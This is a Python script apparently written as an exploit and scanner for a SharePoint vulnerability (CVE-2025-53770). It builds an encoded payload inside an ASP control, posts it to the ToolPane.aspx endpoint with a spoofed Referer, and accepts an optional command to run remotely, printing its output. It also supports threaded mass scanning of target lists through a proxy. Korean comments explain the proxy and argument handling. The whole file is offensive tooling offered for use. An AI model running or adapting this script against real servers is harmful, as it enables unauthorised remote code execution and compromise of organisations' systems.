import requests
import base64
import zlib
import re
import sys
import os
import argparse
from concurrent.futures import ThreadPoolExecutor

__AUTHOR__ = "hanmin0512 (Requests & Proxy Enhanced)"
checkStr = "Sharepoint_CVE-2025-53770_Validator"

def buildPayload(cmd=None):
    xmlGadget = f"""<root><cmd>{cmd if cmd else checkStr}</cmd></root>"""
    compressor = zlib.compressobj(9, zlib.DEFLATED, 31)
    compressed = compressor.compress(xmlGadget.encode()) + compressor.flush()
    b64Payload = base64.b64encode(compressed).decode()
    return f"""<asp:UpdateProgress ID="up" runat="server"><ProgressTemplate> <Scorecard:ExcelDataSet CompressedDataTable="{b64Payload}" Command="{cmd if cmd else ''}" runat="server" /> </ProgressTemplate></asp:UpdateProgress>"""

def runTask(target, cmd, proxies=None):
    if not target.startswith("http"):
        target = f"http://{target}"
        
    vulnUrl = f"{target.rstrip('/')}/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=/ToolPane.aspx"
    reqHeaders = {
        "Referer": f"{target}/_layouts/15/",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) OpSec/2.0"
    }
    postData = {
        "MSOTlPn_Uri": target,
        "MSOTlPn_DWP": buildPayload(cmd)
    }
    
    try:
        # requests.post 요청에 proxies 설정을 바인딩합니다.
        response = requests.post(
            vulnUrl, 
            headers=reqHeaders, 
            data=postData, 
            verify=False, 
            timeout=10, 
            proxies=proxies
        )
        resBody = response.text
        
        if not cmd:
            match = re.search(r'CompressedDataTable=&quot;([^&]+)', resBody)
            if match and (checkStr in resBody or "VANDA_TEST" in resBody):
                print(f"[!] VULNERABLE: {target}")
                return
            print(f"[-] SAFE: {target}")
        else:
            if "[RCE_OUTPUT]" in resBody:
                output = resBody.split("[RCE_OUTPUT]:")[-1].split("</body>")[0].strip()
                print(f"[+] RCE SUCCESS [{target}]:\n{output}")
            else:
                print(f"[*] TASK SENT: {target} (HTTP {response.status_code})")
                
    except Exception as e:
        print(f"[?] ERROR: {target} -> Exception:`{str(e)}`")

def main():
    # 파라미터 관리를 직관적으로 처리하기 위해 argparse 객체를 사용합니다.
    parser = argparse.ArgumentParser(description="SharePoint CVE-2025-53770 vulnerability checker with Proxy support.")
    parser.add_argument("-t", "--target", required=True, help="Target URL or a file containing target URLs (one per line)")
    parser.add_argument("-c", "--cmd", help="Optional command to execute for RCE verification")
    parser.add_argument("-p", "--proxy", help="Proxy L (e.g., http://127.0.0.1:8080)")
    parser.add_argument("-w", "--workers", type=int, default=10, help="Number of concurrent threads (default: 10)")
    
    args = parser.parse_args()
    
    # 타겟 목록 처리
    targets = [args.target] if not os.path.isfile(args.target) else [l.strip() for l in open(args.target) if l.strip()]
    
    # 프록시 딕셔너리 구성
    proxies = None
    if args.proxy:
        proxies = {
            "http": args.proxy,
            "https": args.proxy
        }
        print(f"[*] Using proxy: {args.proxy}")
        
    # urllib3 경고 창 숨기기
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()

    # 동시성 처리를 유지하면서 프록시 세팅 전달
    with ThreadPoolExecutor(max_workers=args.workers) as executor:
        executor.map(lambda t: runTask(t, args.cmd, proxies), targets)

if __name__ == "__main__":
    main()
